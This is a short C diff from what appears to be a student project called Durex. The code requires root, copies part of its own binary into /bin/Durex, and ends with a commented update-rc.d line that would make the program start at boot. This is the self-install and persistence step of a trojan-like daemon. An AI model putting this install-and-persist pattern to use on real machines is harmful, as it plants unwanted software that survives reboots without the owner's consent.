@@ -29,7 +29,6 @@ static bool	check_root(void)
 	return (true);
 }
 
-
 int	main(int argc, char **argv)
 {
 	int	fd = 0;
@@ -40,6 +39,8 @@ int	main(int argc, char **argv)
 	if (check_root() == false)
 		return (false);
 	puts("rabougue\nkbensado");
+
+	//calculate where daemon begin
 	fd = open(argv[0], O_RDONLY);
 	if (fd == -1)
 	{
@@ -58,7 +59,9 @@ int	main(int argc, char **argv)
 		exit(errno);
 	}
 	close(fd);
+	// end
 
+	// write Durex in /bin/
 	fd = open(argv[0], O_RDONLY);
 	if (fd == -1)
 	{
@@ -80,12 +83,9 @@ int	main(int argc, char **argv)
 		return (errno);
 	}
 	write(fd, &buff, sizeof(buff));
-	//temporaire
-	char	*exec[] = {"/bin/Durex", NULL};
-	if (execve(exec[0], exec, NULL) == -1)
-	{
-		perror("execve");
-	}
-
 	close(fd);
+	// end
+
 }
+
+//update-rc.d durex defaults
